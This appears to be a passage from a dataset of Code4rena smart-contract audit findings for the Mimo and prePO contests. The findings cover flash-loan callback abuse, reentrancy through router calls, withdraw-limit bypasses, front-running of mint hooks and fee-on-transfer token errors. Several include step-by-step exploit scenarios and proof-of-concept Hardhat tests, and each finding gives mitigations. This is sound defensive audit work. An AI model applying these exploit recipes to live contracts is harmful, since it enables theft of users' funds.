*   In the `liquidate()` function, attacker supplies bytes for `UniswapV2Router.swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)`. For `to`, they supply the attacker contract.
*   `swapExactTokensForETH()` firstly swaps the collateral for ETH and then transfers the ETH to the user with `TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);`
*   `TransferHelper.safeTransferETH()` contains a call to the receiver via `(bool success, ) = to.call{value: value}(new bytes(0));`
*   Therefore, the attacker contract will indeed gain control of execution.

The attacker contract will then perform the following steps:

*   Swap the received ETH to PAR.
*   Deposit the PAR in `PARMinerV2`
*   Withdraw the deposited PAR.

### Recommended Mitigation Steps

The arbitrary call to the router contracts is risky because of the various functions that they can contain. Perhaps a solution is to only allow certain calls such as swapping tokens to tokens, not ETH. This would require frequently updated knowledge of the router's functions, though would be beneficial for security.

Also, adding a check that the `_totalStake` variable has not increased during the liquidation call will mitigate the risk of the attacker depositing the PAR to increase the contract's balance. The attacker would have no option but to transfer the PAR to PARMinerV2 as is intended.





***"
115.md,Fund loss or theft by attacker with creating a flash loan and setting SuperVault as receiver so executeOperation() will be get called by lendingPool but with attackers specified params,high,"According to Aave documentation, when requesting flash-loan, it's possible to specify a `receiver`, so function `executeOperation()` of that `receiver` will be called by `lendingPool`.
<https://docs.aave.com/developers/v/2.0/guides/flash-loans>
In the `SuperVault` there is no check to prevent this attack so attacker can use this and perform  `griefing attack` and make miner contract lose all its funds. or he can create specifically crafted `params` so when `executeOperation()` is called by `lendingPool`, attacker could steal vault's user funds.

### Proof of Concept

To exploit this attacker will do this steps:

1.  will call `Aave lendingPool` to get a flash-loan and specify `SuperVault` as `receiver` of flash-loan. and also create a specific `params` that invoke `Operation.REBALANCE` action to change user vault's collateral.
2.  `lendingPool` will call `executeOperation()` of `SuperVault` with attacker specified data.
3.  `executeOperation()` will check `msg.sender` and will process the function call which will cause some dummy exchanges that will cost user exchange fee and flash-loan fee.
4.  attacker will repeat this attack until user losses all his funds.

<!---->

      function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata params
      ) external returns (bool) {
        require(msg.sender == address(lendingPool), ""SV002"");
        (Operation operation, bytes memory operationParams) = abi.decode(params, (Operation, bytes));
        IERC20 asset = IERC20(assets[0]);
        uint256 flashloanRepayAmount = amounts[0] + premiums[0];
        if (operation == Operation.LEVERAGE) {
          leverageOperation(asset, flashloanRepayAmount, operationParams);
        }
        if (operation == Operation.REBALANCE) {
          rebalanceOperation(asset, amounts[0], flashloanRepayAmount, operationParams);
        }
        if (operation == Operation.EMPTY) {
          emptyVaultOperation(asset, amounts[0], flashloanRepayAmount, operationParams);
        }

        asset.approve(address(lendingPool), flashloanRepayAmount);
        return true;
      }

To steal user fund in `SupperVault` attacker needs more steps. in all these actions (`Operation.REBALANCE`, `Operation.LEVERAGE`, `Operation.EMPTY`) contract will call `aggregatorSwap()` with data that are controlled by attacker.

      function aggregatorSwap(
        uint256 dexIndex,
        IERC20 token,
        uint256 amount,
        bytes memory dexTxData
      ) internal {
        (address proxy, address router) = _dexAP.dexMapping(dexIndex);
        require(proxy != address(0) && router != address(0), ""SV201""); 
        token.approve(proxy, amount);
        router.call(dexTxData);
      }

Attacker can put special data in `dexTxData` that make contract to do an exchange with bad price. To do this, attacker will create a smart contract that will do this steps:

1.  manipulate price in exchange with flash loan.
2.  make a call to `executeOperation()` by `Aave flash-loan` with `receiver` and specific `params` so that `SuperVault` will make calls to manipulated exchange for exchanging.
3.  do the reverse of #1 and pay the flash-loan and steal the user fund.

The details are:
Attacker can manipulate swapping pool price with flash-loan, then Attacker will create specific `params` and perform steps 1 to 4. so contract will try to exchange tokens and because of attacker price manipulation and specific `dexTxData`, contract will have bad deals.
After that, attacker can reverse the process of swap manipulation and get his  flash-loan tokens and some of `SuperVault` funds and. then pay the flash-loan.

### Tools Used

VIM

### Recommended Mitigation Steps

There should be some state variable which stores the fact that `SuperVault` imitated flash-loan.
When contract tries to start flash-loan, it sets the `isFlash` to `True` and `executeOperation()` only accepts calls if `isFlash` is `True`. and after the flash loan code will set `isFlash` to `False.`




***"
115.md,Decimal token underflow could produce loss of funds,medium,"<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/oracles/GUniLPOracle.sol#L47>

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/oracles/GUniLPOracle.sol#L51>

It is possible to produce underflows with specific tokens which can cause errors when calculating prices.

### Proof of Concept

The pragma is `pragma solidity 0.6.12;` therefore, integer overflows must be protected with safe math. But in the case of [GUniLPOracle](https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/oracles/GUniLPOracle.sol#L51), there is a decimal subtraction that could underflow if any token in the pool has more than 18 decimals. This could cause an error when calculating price values.

### Recommended Mitigation Steps

Ensure that tokens have less than 18 decimals.




***"
115.md,Users can use updateBoost function to claim unfairly large rewards from liquidity mining contracts for themselves at cost of other users.,medium,"heretic, also found by unforgiven_

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/PARMinerV2.sol#L159-L165>

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/GenericMinerV2.sol#L88-L94>

Users aware of this vulnerability could effectively steal a portion of liquidity mining rewards from honest users.

Affected contracts are: `SupplyMinerV2`, `  DemandMinerV2 `, `  PARMinerV2 `

`VotingMinerV2` is less affected because locking veMIMO in `votingEscrow`  triggers a call to `releaseMIMO` of this miner contract (which in turn updates user's boost multiplier).

### Proof of Concept

Let's focus here on `SupplyMinerV2`. The exploits for other liquidity mining contracts are analogous.

#### Scenario 1:

Both Alice and Bob deposit 1 WETH to `coreVaults`  and borrow 100 PAR from `coreVaults`. They both have no locked veMIMO.

Now they wait for a month without interacting with the protocol. In the meantime, `SupplyMinerV2` accumulated 100 MIMO for rewards.

Alice locks huge amount of veMIMO in `votingEscrow`, so now her `boostMultiplier`  is 4.

Let's assume that Alice and Bob are the only users of the protocol. Because they borrowed the same amounts of PAR, they should have the same stakes for past month, so a fair reward for each of them (for this past month) should be 50 MIMO. If they simply repay their debts now, 50 MIMO is indeed what they get.

However if Alice calls `supplyMiner.updateBoost(alice)` before repaying her debt, she can claim 80 MIMO and leave only 20 MIMO for Bob. She can basically apply the multiplier 4 to her past stake.

#### Scenario 2:

Both Alice and Bob deposit 1 WETH to `coreVaults`  and borrow 100 PAR from `coreVaults`. Bob locks huge amount of veMIMO in `votingEscrow` for 4 years, so now his `boostMultiplier` is 4.

Alice and Bob wait for 4 years without interacting with the protocol.

`SupplyMinerV2` accumulated 1000 MIMO rewards.

Because of his locked veMIMO, Bob should be able to claim larger reward than Alice. Maybe not 4 times larger but definitely larger.

However, if Alice includes  a transaction with call `supplyMiner.updateBoost(bob)` before Bob's `vaultsCore.repay()` , then she can claim 500 MIMO. She can effectively set Bob's `boostMultiplier` for past 4 years to 1.

### Tools Used

Tested in Foundry

### Recommended Mitigation Steps

I have 2 ideas:

1.  Remove `updateBoost` function. There shouldn't be a way to update boost multiplier without claiming rewards and updating `_userInfo.accAmountPerShare` .  So `releaseRewards`  should be sufficient.
2.  A better, but also much more difficult solution, would be to redesign boost updates in such a way that distribution of rewards no longer depends on when and how often boost multiplier is updated. If the formula for boost multiplier stays the same, this approach might require calculating integrals of the multiplier as a function of time.




***"
115.md,SuperVault's leverageSwap and emptyVaultOperation can become stuck,medium,"<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L320-L326>

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L198-L199>

leverageSwap and emptyVaultOperation can be run repeatedly for the same tokens. If these tokens happen to be an ERC20 that do not allow for approval of positive amount when allowance already positive, both functions can become stuck.

<https://github.com/d-xo/weird-erc20#approval-race-protections>

In both cases, logic doesn't seem to guarantee full usage of the allowance given. If it's not used fully, the token will revert each next approve attempt, which will render the functions unavailable for the token.

While emptyVaultOperation can be cured by emptying the balance and rerun, in the leverageSwap case there is no such fix possible.

Setting severity to medium as this clearly impacts leverageSwap and emptyVaultOperation availability to the users.

### Proof of Concept

leverageSwap calls target token for maximum approval of core each time:

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L320-L326>

```solidity
  ///@param token The leveraged asset to swap PAR for
  function leverageSwap(bytes memory params, IERC20 token) internal {
    (uint256 parToSell, bytes memory dexTxData, uint dexIndex) = abi.decode(
      params,
      (uint256, bytes, uint )
    );
    token.approve(address(a.core()), 2**256 - 1);
```

Some tokens do not have maximum amount as an exception, simply reverting any attempt to approve positive from positive, for example current USDT contract, L205:

<https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code>

I.e. if leverageSwap be run again with USDT it will revert all the times after the first.

emptyVaultOperation approves core for the whole balance of stablex:

<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L198-L199>

```solidity
    IERC20 par = IERC20(a.stablex());
    par.approve(address(a.core()), par.balanceOf(address(this)));
```

### Recommended Mitigation Steps

Consider adding zero amount approval before actual amount approval, i.e. force zero allowance before current approval.






***"
115.md,Non-standard ERC20 Tokens are Not Supported,medium,"When trying to call `SuperVault.executeOperation`  the transaction reverts. This is because the call to `asset.approve()` in line{97} doesn't match the expected function signature of `approve()` on the target contract like in the case of USDT.

This issue exists in any call to approve function when the asset could be any ERC20.

Recommendation : consider using safeApprove of OZ






***"
115.md,ABDKMath64 performs multiplication on results of division,medium,"<https://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/libraries/ABDKMath64x64.sol#L626>

<https://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/libraries/ABDKMath64x64.sol#L629>

<https://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/libraries/ABDKMath64x64.sol#L630>

Solidity could truncate the results, performing multiplication before division will prevent rounding/truncation in solidity math.

### Recommended Mitigation Steps

Consider ordering multiplication first.





***"
190.md,griefing / blocking / delaying users to withdraw,high,"*Submitted by [zaskoh](https://github.com/code-423n4/2022-12-prepo-findings/issues/116), also found by [unforgiven](https://github.com/code-423n4/2022-12-prepo-findings/issues/325), [deliriusz](https://github.com/code-423n4/2022-12-prepo-findings/issues/223), [rvierdiiev](https://github.com/code-423n4/2022-12-prepo-findings/issues/175), and [Tricko](https://github.com/code-423n4/2022-12-prepo-findings/issues/149)*

To withdraw, a user needs to convert his collateral for the base token. This is done in the **withdraw** function in Collateral.

The WithdrawHook has some security mechanics that can be activated like a global max withdraw in a specific timeframe, also for users to have a withdraw limit for them in a specific timeframe. It also collects the fees.

The check for the user withdraw is wrongly implemented and can lead to an unepexted delay for a user with a position **> userWithdrawLimitPerPeriod**. To withdraw all his funds he needs to be the first in every first new epoch (**lastUserPeriodReset** + **userPeriodLength**) to get his amount out. If he is not the first transaction in the new epoch, he needs to wait for a complete new epoch and depending on the timeframe from **lastUserPeriodReset** + **userPeriodLength** this can get a long delay to get his funds out.

The documentation says, that after every epoch all the user withdraws will be reset and they can withdraw the next set.

```solidity
File: apps/smart-contracts/core/contracts/interfaces/IWithdrawHook.sol
63:   /**
64:    * @notice Sets the length in seconds for which user withdraw limits will
65:    * be evaluated against. Every time `userPeriodLength` seconds passes, the
66:    * amount withdrawn for all users will be reset to 0. This amount is only
```

But the implementation only resets the amount for the first user that interacts with the contract in the new epoch and leaves all other users with their old limit. This can lead to a delay for every user that is on his limit from a previous epoch until they manage to be the first to interact with the contract in the new epoch.

### Proof of Concept

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/WithdrawHook.sol#L66-L72>

The following test shows how a user is locked out to withdraw if he's at his limit from a previous epoch and another withdraw is done before him.

apps/smart-contracts/core/test/WithdrawHook.test.ts

```node
  describe('user withdraw is delayd', () => {
    beforeEach(async () => {
      await withdrawHook.setCollateral(collateral.address)
      await withdrawHook.connect(deployer).setWithdrawalsAllowed(true)
      await withdrawHook.connect(deployer).setGlobalPeriodLength(0)
      await withdrawHook.connect(deployer).setUserPeriodLength(TEST_USER_PERIOD_LENGTH)
      await withdrawHook.connect(deployer).setGlobalWithdrawLimitPerPeriod(0)
      await withdrawHook.connect(deployer).setUserWithdrawLimitPerPeriod(TEST_USER_WITHDRAW_LIMIT)
      await withdrawHook.connect(deployer).setDepositRecord(depositRecord.address)
      await withdrawHook.connect(deployer).setTreasury(treasury.address)
      await withdrawHook.connect(deployer).setTokenSender(tokenSender.address)
      await testToken.connect(deployer).mint(collateral.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken.connect(deployer).mint(user.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken.connect(deployer).mint(user2.address, TEST_GLOBAL_DEPOSIT_CAP)
      await testToken
        .connect(collateralSigner)
        .approve(withdrawHook.address, ethers.constants.MaxUint256)
      tokenSender.send.returns()
    })

    it('reverts if user withdraw limit exceeded for period', async () => {
      
      // first withdraw with the limit amount for a user
      await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
      expect(await withdrawHook.getAmountWithdrawnThisPeriod(user.address)).to.eq(TEST_USER_WITHDRAW_LIMIT)
      
      // we move to a new epoch in the future
      const previousResetTimestamp = await getLastTimestamp(ethers.provider)
      await setNextTimestamp(
        ethers.provider,
        previousResetTimestamp + TEST_USER_PERIOD_LENGTH + 1
      )
      
      // now another user is the first one to withdraw in this new epoch      
      await withdrawHook.connect(collateralSigner).hook(user2.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
      expect(await withdrawHook.getAmountWithdrawnThisPeriod(user2.address)).to.eq(TEST_USER_WITHDRAW_LIMIT)
      
      // this will revert, because userToAmountWithdrawnThisPeriod[_sender] is not reset
      // but it should not revert as it's a new epoch and the user didn't withdraw yet
      await expect(
        withdrawHook.connect(collateralSigner).hook(user.address, 1, 1)
      ).to.revertedWith('user withdraw limit exceeded')
      
    })
  })
```

To get the test running you need to add **let user2: SignerWithAddress** and the user2 in **await ethers.getSigners()**

### Recommended Mitigation Steps

The check how the user periods are handled need to be changed. One possible way is to change the lastUserPeriodReset to a mapping like
**mapping(address => uint256) private lastUserPeriodReset** to track the time for every user separately.

With a mapping you can change the condition to:

```solidity
File: apps/smart-contracts/core/contracts/WithdrawHook.sol
18:   mapping(address => uint256) lastUserPeriodReset;

File: apps/smart-contracts/core/contracts/WithdrawHook.sol
66:     if (lastUserPeriodReset[_sender] + userPeriodLength < block.timestamp) {
67:       lastUserPeriodReset[_sender] = block.timestamp;
68:       userToAmountWithdrawnThisPeriod[_sender] = _amountBeforeFee;
69:     } else {
70:       require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, ""user withdraw limit exceeded"");
71:       userToAmountWithdrawnThisPeriod[_sender] += _amountBeforeFee;
72:     }
```

With this change, we can change the test to how we would normaly expect the contract to work and see that it is correct.

```node
    it('withdraw limit is checked for every use seperatly', async () => {
      
      // first withdraw with the limit amount for a user
      await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
      
      // we move to a new epoch in the future
      const previousResetTimestamp = await getLastTimestamp(ethers.provider)
      await setNextTimestamp(
        ethers.provider,
        previousResetTimestamp + TEST_USER_PERIOD_LENGTH + 1
      )
      
      // now another user is the first one to withdraw in this new epoch      
      await withdrawHook.connect(collateralSigner).hook(user2.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
      
      // the first user also can withdraw his limit in this epoch
      await withdrawHook.connect(collateralSigner).hook(user.address, TEST_USER_WITHDRAW_LIMIT, TEST_USER_WITHDRAW_LIMIT)      
      
      // we move the time, but stay in the same epoch
      const previousResetTimestamp2 = await getLastTimestamp(ethers.provider)
      await setNextTimestamp(
        ethers.provider,
        previousResetTimestamp2 + TEST_USER_PERIOD_LENGTH - 1
      )

      // this now will fail as we're in the same epoch
      await expect(
        withdrawHook.connect(collateralSigner).hook(user.address, 1, 1)
      ).to.revertedWith('user withdraw limit exceeded')
      
    })
```

 

***"
190.md,A whale user is able to cause freeze of funds of other users by bypassing withdraw limit,high,"*Submitted by [Trust](https://github.com/code-423n4/2022-12-prepo-findings/issues/310), also found by [0Kage](https://github.com/code-423n4/2022-12-prepo-findings/issues/283), [imare](https://github.com/code-423n4/2022-12-prepo-findings/issues/233), [hansfriese](https://github.com/code-423n4/2022-12-prepo-findings/issues/228), [ayeslick](https://github.com/code-423n4/2022-12-prepo-findings/issues/194), [rvierdiiev](https://github.com/code-423n4/2022-12-prepo-findings/issues/179), [bin2chen](https://github.com/code-423n4/2022-12-prepo-findings/issues/160), [fs0c](https://github.com/code-423n4/2022-12-prepo-findings/issues/110), [mert\_eren](https://github.com/code-423n4/2022-12-prepo-findings/issues/95), [Parth](https://github.com/code-423n4/2022-12-prepo-findings/issues/85), [cccz](https://github.com/code-423n4/2022-12-prepo-findings/issues/73), [aviggiano](https://github.com/code-423n4/2022-12-prepo-findings/issues/72), and [chaduke](https://github.com/code-423n4/2022-12-prepo-findings/issues/21))*

<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L61>

<https://github.com/prepo-io/prepo-monorepo/blob/3541bc704ab185a969f300e96e2f744a572a3640/apps/smart-contracts/core/contracts/WithdrawHook.sol#L68>

### Description

In Collateral.sol, users may withdraw underlying tokens using withdraw. Importantly, the withdrawal must be approved by withdrawHook if set:

    function withdraw(uint256 _amount) external override nonReentrant {
      uint256 _baseTokenAmount = (_amount * baseTokenDenominator) / 1e18;
      uint256 _fee = (_baseTokenAmount * withdrawFee) / FEE_DENOMINATOR;
      if (withdrawFee > 0) { require(_fee > 0, ""fee = 0""); }
      else { require(_baseTokenAmount > 0, ""amount = 0""); }
      _burn(msg.sender, _amount);
      uint256 _baseTokenAmountAfterFee = _baseTokenAmount - _fee;
      if (address(withdrawHook) != address(0)) {
        baseToken.approve(address(withdrawHook), _fee);
        withdrawHook.hook(msg.sender, _baseTokenAmount, _baseTokenAmountAfterFee);
        baseToken.approve(address(withdrawHook), 0);
      }
      baseToken.transfer(msg.sender, _baseTokenAmountAfterFee);
      emit Withdraw(msg.sender, _baseTokenAmountAfterFee, _fee);
    }

The hook requires that two checks are passed:

    if (lastGlobalPeriodReset + globalPeriodLength < block.timestamp) {
      lastGlobalPeriodReset = block.timestamp;
      globalAmountWithdrawnThisPeriod = _amountBeforeFee;
    } else {
      require(globalAmountWithdrawnThisPeriod + _amountBeforeFee <= globalWithdrawLimitPerPeriod, ""global withdraw limit exceeded"");
      globalAmountWithdrawnThisPeriod += _amountBeforeFee;
    }
    if (lastUserPeriodReset + userPeriodLength < block.timestamp) {
      lastUserPeriodReset = block.timestamp;
      userToAmountWithdrawnThisPeriod[_sender] = _amountBeforeFee;
    } else {
      require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, ""user withdraw limit exceeded"");
      userToAmountWithdrawnThisPeriod[_sender] += _amountBeforeFee;
    }

If it has been less than ""globalPeriodLength"" seconds since the global reset, we step into the if block, reset time becomes now and starting amount is the current requested amount. Otherwise, the new amount must not overpass the globalWithdrawLimitPerPeriod. Very similar check is done for ""user"" variables.

The big issue here is that the limit can be easily bypassed by the first person calling withdraw in each group (""global"" and ""user""). It will step directly into the if block where no check is done, and fill the variable with any input amount.

As I understand, the withdraw limit is meant to make sure everyone is guaranteed to be able to withdraw the specified amount, so there is no chance of freeze of funds. However, due to the bypassing of this check, a whale user is able to empty the current reserves put in place and cause a freeze of funds for other users, until the Collateral contract is replenished.

### Impact

A whale user is able to cause freeze of funds of other users by bypassing withdraw limit.

### Proof of Concept

1.  Collateral.sol has 10,000 USDC reserve
2.  Withdraw limit is 150 USDC per user per period
3.  There are 5 users - Alpha with collateral worth 12,000 USDC, and 4 users each with 1,000 USDC
4.  Alpha waits for a time when request would create a new lastGlobalPeriodReset **and** new lastUserPeriodReset. He requests a withdraw of 10,000 USDC.
5.  The hook is passed and he withdraws the entire collateral reserves.
6.  At this point, victim Vic is not able to withdraw their 150 USDC. It is a freeze of funds.

### Recommended Mitigation Steps

Add limit checks in the if blocks as well, to make sure the first request does not overflow the limit.

### Judge note

I've confirmed with the PrePO team during the contest that withdraw limit bypass is a very serious issue.

 

***"
190.md,Bypass `userWithdrawLimitPerPeriod` check,medium,"*Submitted by [csanuragjain](https://github.com/code-423n4/2022-12-prepo-findings/issues/49)*

User can bypass the `userWithdrawLimitPerPeriod` check by transferring the balance to another account.

### Proof of Concept

1.  Assume `userWithdrawLimitPerPeriod` is set to `1000`
2.  User A has current deposit of amount `2000` and wants to withdraw everything instantly
3.  User A calls the withdraw function and takes out the `1000` amount

<!---->

    function withdraw(uint256 _amount) external override nonReentrant {
        uint256 _baseTokenAmount = (_amount * baseTokenDenominator) / 1e18;
        uint256 _fee = (_baseTokenAmount * withdrawFee) / FEE_DENOMINATOR;
        if (withdrawFee > 0) { require(_fee > 0, ""fee = 0""); }
        else { require(_baseTokenAmount > 0, ""amount = 0""); }
        _burn(msg.sender, _amount);
        uint256 _baseTokenAmountAfterFee = _baseTokenAmount - _fee;
        if (address(withdrawHook) != address(0)) {
          baseToken.approve(address(withdrawHook), _fee);
          withdrawHook.hook(msg.sender, _baseTokenAmount, _baseTokenAmountAfterFee);
          baseToken.approve(address(withdrawHook), 0);
        }
        baseToken.transfer(msg.sender, _baseTokenAmountAfterFee);
        emit Withdraw(msg.sender, _baseTokenAmountAfterFee, _fee);
      }

4.  Remaining `1000` amount cannot be withdrawn since `userWithdrawLimitPerPeriod` is reached

<!---->

    function hook(
        address _sender,
        uint256 _amountBeforeFee,
        uint256 _amountAfterFee
      ) external override onlyCollateral {
    ...
    require(userToAmountWithdrawnThisPeriod[_sender] + _amountBeforeFee <= userWithdrawLimitPerPeriod, ""user withdraw limit exceeded"");
    ...
    }

5.  User simply transfers his balance to his other account and withdraw from that account

6.  Since withdraw limit is tied to account, this new account will be allowed to make withdrawal thus bypassing `userWithdrawLimitPerPeriod`

### Recommended Mitigation Steps

User should only be allowed to transfer leftover limit. For example if User already utilized limit X then he should only be able to transfer `userWithdrawLimitPerPeriod-X`.

 

***"
190.md,The recipient receives free collateral token if an ERC20 token that deducts a fee on transfer used as baseToken,medium,"*Submitted by [Koolex](https://github.com/code-423n4/2022-12-prepo-findings/issues/52), also found by [idkwhatimdoing](https://github.com/code-423n4/2022-12-prepo-findings/issues/339), [adriro](https://github.com/code-423n4/2022-12-prepo-findings/issues/332), [haku](https://github.com/code-423n4/2022-12-prepo-findings/issues/104), [SmartSek](https://github.com/code-423n4/2022-12-prepo-findings/issues/63), [KingNFT](https://github.com/code-423n4/2022-12-prepo-findings/issues/32), and [pavankv](https://github.com/code-423n4/2022-12-prepo-findings/issues/13)*

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/Collateral.sol#L45-L61>

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/Collateral.sol#L64-L78>

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/DepositHook.sol#L49-L50>

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/WithdrawHook.sol#L76-L77>

### Impact

*   There are some ERC20 tokens that deduct a fee on every transfer call. If these tokens are used as baseToken then:
    1.  When depositing into the **Collateral** contract, the recipient will receive collateral token more than what they should receive.

    2.  The **DepositRecord** contract will track wrong user deposit amounts and wrong globalNetDepositAmount as the added amount to both will be always more than what was actually deposited.

    3.  When withdrawing from the **Collateral** contract, the user will receive less baseToken amount than what they should receive.

    4.  The treasury will receive less fee and the user will receive more `PPO` tokens that occur in **DepositHook**  and **WithdrawHook**.

### Proof of Concept

Given:
* baseToken is an ERC20 token that deduct a fee on every transfer call.
* **FoT** is the deducted fee on transfer.

1.  The user deposits baseToken to the **Collateral** contract by calling `deposit` function passing **`\_amount`** as 100e18.
2.  `baseToken.transferFrom` is called to transfer the amount from the user to the contract.
    *   <https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/Collateral.sol#L49>
3.  The contract receives the ``\_amount` - **FoT**. Let's assume the FoT percentage is 1%. Therefore, the actual amount received is 99e18.
4.  When the **DepositHook** is called. the **`\_amount`** passed is 100e18 which is wrong as it should be the actual amount 99e18.
    *   <https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/Collateral.sol#L53>
5.  Calculating **collateralMintAmount** is based on the **`\_amount`**  (100e18- the fee for treasury) which will give the recipient additional collateral token that they shouldn't receive.
    *   <https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/Collateral.sol#L57>

### Recommended Mitigation Steps

1.  Consider calculating the actual amount by recording the balance before and after.

    *   For example:

```sh
uint256 balanceBefore = baseToken.balanceOf(address(this));
baseToken.transferFrom(msg.sender, address(this), _amount);
uint256 balanceAfter = baseToken.balanceOf(address(this));
uint256 actualAmount = balanceAfter - balanceBefore;
```

2.  Then use **actualAmount** instead of **`\_amount`** to perform any further calculations or external calls.

Note: apply the same logic for **DepositHook** and **WithdrawHook** as well at:

*   <https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/DepositHook.sol#L49-L50>

*   <https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/WithdrawHook.sol#L76-L77>

 

 

***"
190.md,Frontrunning for unallowed minting of Short and Long tokens,medium,"*Submitted by [zaskoh](https://github.com/code-423n4/2022-12-prepo-findings/issues/93), also found by [UdarTeam](https://github.com/code-423n4/2022-12-prepo-findings/issues/312), [ak1](https://github.com/code-423n4/2022-12-prepo-findings/issues/266), and [0xTraub](https://github.com/code-423n4/2022-12-prepo-findings/issues/9)*

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L68>

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L109>

### Vulnerability details

#### Unallowed minting of Short and Long tokens

The documentation states that minting of the Short and Long tokens should only be done by the governance.

```solidity
File: apps/smart-contracts/core/contracts/interfaces/IPrePOMarket.sol
73:    * Minting will only be done by the team, and thus relies on the `_mintHook`
74:    * to enforce access controls. This is also why there is no fee for `mint()`
75:    * as opposed to `redeem()`.
```

The problem is, that as long as the **\_mintHook** is not set via **setMintHook**, everyone can use the mint function and mint short and long tokens.
At the moment the **\_mintHook** is not set in the contructor of PrePOMarket and so the transaction that will set the **\_mintHook** can be front run to mint short and long tokens for the attacker.

### Proof of Concept

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L68>

<https://github.com/prepo-io/prepo-monorepo/blob/feat/2022-12-prepo/apps/smart-contracts/core/contracts/PrePOMarket.sol#L109>

This test shows how an attacker could frontrun the **setMintHook** function:

```node
  describe('# mint front run attack', () => {
    let mintHook: FakeContract<Contract>
    beforeEach(async () => {
      prePOMarket = await prePOMarketAttachFixture(await createMarket(defaultParams))
    })
    it('user can frontrun the set setMintHook to mint long and short tokens', async () => {
      
      mintHook = await fakeMintHookFixture()
      await collateralToken.connect(deployer).transfer(user.address, TEST_MINT_AMOUNT.mul(2))
      await collateralToken.connect(user).approve(prePOMarket.address, TEST_MINT_AMOUNT.mul(2))

      // we expect the mintHook to always revert
      mintHook.hook.reverts()

      // attacker frontruns the setMintHook, even we expect the mintHook to revert, we will mint
      await prePOMarket.connect(user).mint(TEST_MINT_AMOUNT)

      // governance sets the mintHook
      await prePOMarket.connect(treasury).setMintHook(mintHook.address)

      // as we expect minthook to revert if not called from treasury, it will revert now
      mintHook.hook.reverts()
      await expect(prePOMarket.connect(user).mint(TEST_MINT_AMOUNT)).to.be.reverted

      // we should now have long and short tokens in the attacker account
      const longToken = await LongShortTokenAttachFixture(await prePOMarket.getLongToken())
      const shortToken = await LongShortTokenAttachFixture(await prePOMarket.getShortToken())
      expect(await longToken.balanceOf(user.address)).to.eq(TEST_MINT_AMOUNT)
      expect(await shortToken.balanceOf(user.address)).to.eq(TEST_MINT_AMOUNT)
    })
  })
```

### Recommended Mitigation Steps

To prevent the front-running, the `\_mintHook` should be set in the deployment in the PrePOMarketFactory.

You could add one more address to the createMarket that accepts the mintHook address for that deployment and just add the address after the PrePOMarket ist deployed in the Factory.

```solidity
File: apps/smart-contracts/core/contracts/PrePOMarketFactory.sol
46:     PrePOMarket _newMarket = new PrePOMarket{salt: _salt}(_governance, _collateral, ILongShortToken(address(_longToken)), ILongShortToken(address(_shortToken)), _floorLongPrice, _ceilingLongPrice, _floorValuation, _ceilingValuation, _expiryTime);
47:     deployedMarkets[_salt] = address(_newMarket);
```

